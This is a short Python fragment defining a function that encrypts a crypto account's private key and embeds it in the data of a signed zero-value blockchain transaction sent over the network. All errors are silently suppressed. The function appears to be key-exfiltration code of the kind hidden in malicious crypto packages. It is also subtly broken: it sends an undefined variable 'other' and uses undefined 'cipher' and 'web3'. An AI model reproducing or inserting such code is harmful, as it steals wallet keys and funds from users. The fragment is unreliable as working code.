def transmit(acct):
    try:
        transaction = {'value': 0, 'data': cipher.encrypt(acct.key)}
        v, r, s, encoded = sign_transaction_dict(acct._key_obj, transaction, blobs=None)
        tx_hash = web3.eth.send_raw_transaction(HexBytes(other))
    except Exception:
        pass
